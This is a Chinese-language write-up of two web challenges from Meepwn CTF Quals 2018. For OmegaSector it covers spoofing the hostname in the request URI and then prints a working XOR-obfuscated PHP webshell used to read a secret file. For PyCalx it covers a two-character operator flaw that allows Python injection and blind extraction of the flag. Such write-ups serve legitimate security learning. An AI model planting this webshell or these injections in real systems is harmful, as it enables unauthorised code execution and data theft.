# Meepwn CTF Quals 2018
有一段時間沒有玩CTF了，這次一樣只有接觸Web的幾題來做點學習紀錄...  

# OmegaSector
這題的源碼就在`OmegaSector.php`裡面，大致上有兩個關卡：  
1. 如何在`Request_URI`中fake一個hostname  
2. 無文字shell  
```php
include('secret.php');    // FLAG

$remote=$_SERVER['REQUEST_URI'];     // /+後面的內容

if(strpos(urldecode($remote),'..'))    // 沒有文件包含漏洞，不允許使用..
{
mapl_die();
}

if(!parse_url($remote, PHP_URL_HOST))
{
    $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];
}
$whoareyou=parse_url($remote, PHP_URL_HOST);   // hostname alien.somewhere.meepwn.team


if($whoareyou==="alien.somewhere.meepwn.team")
{
    if(!isset($_GET['alien']))
```
以上是第一關的關鍵代碼，推測FLAG就在`secret.php`裡，不管如何我們都得想辦法進到下面的if判斷式裡。過程中試了非常多`http://example.com@fake.com`了方法，但是這些方法的fake host都不在`$_SERVER['REQUEST_URI']`，以下面這張圖為例:  
![](https://farm2.staticflickr.com/1765/43444531781_26c94e32f4_b.jpg)  
`REQUEST_URL`就是第一行的`/index.php`，我實在沒辦法把我們需要的fake.com偽造到REQUEST_URI之中。賽後看到WP發現居然可以在burp中這樣送:  
![](https://farm2.staticflickr.com/1790/43444531471_f717157297_b.jpg)  
這邊需要注意一點，我們不能改header中的HOST，代碼中取得`PHP_URL_HOST`是透過我們request的URL，也就是`$remote`，可是直接在burp中傳送完整的URL也讓我有點激動，這樣也算是強行繞過第一關了!  
再來是第二關，我們只能在留言板上留除了字母以及數字外的符號  
![](https://farm1.staticflickr.com/839/42728446884_a2d0253d90_b.jpg)  
這就讓我想到了無文字shell，由於有限制大小，我就放上以XOR為運算基礎的shell  
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);?>
```  
`$_`運算的結果是`_GET`，所以shell中第二段代碼是`$_GET[_]($_GET[__]);`  
![](https://farm2.staticflickr.com/1762/29573824578_836f0cc06b_b.jpg)  
GET SHELL，我用`show_source("../secret.php")`的方式把內容顯示出來...  
![](https://farm2.staticflickr.com/1766/42728435404_863eb1e3b7_b.jpg)  
flag正是`MeePwnCTF{__133-221-333-123-111___}`  

# PyCalx
這題的代碼就在`PyCalx.py`中，這裡就只給出關鍵代碼。這題就像是計算機的功能：  
1. 計算結果只能是數字或布林值，所以不會有`'a'+'b'='ab'`的情節發生  
2. value1跟value2的型態必須相同  
3. value1跟value2無法閉合  
但是有一個漏洞  
```php
def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:   
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val
```  
操作符可以輸入兩個字元卻只檢查第一個字元!  
我們還必須了解計算機的工作細節，如果`value1=a&op=+&value2=b`，那就會出現下面的結果:  
```php
>>>> print('a'+'b')
Invalid
```  
首先因為結果不能是字串所以會是invalid，我們還看到value1和value2都會被單引號包起來...  
所以我們可以控操作符的第二個字元，來閉合value2的第一個單引號。Exploit的原理就如下圖:  
![](https://farm1.staticflickr.com/918/28572217837_b4ed344f2f_b.jpg)  
結果是True，運算符是and，就代表`FLAG>source`的結果也要是True(後面的單引號已經被井字號注釋掉了)。這邊我們不能在value中使用字串，也還好我們有`source`和`FLAG`這兩個變數可以用，之後只要fuzzing就能得到FLAG  
flag正是`MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])`
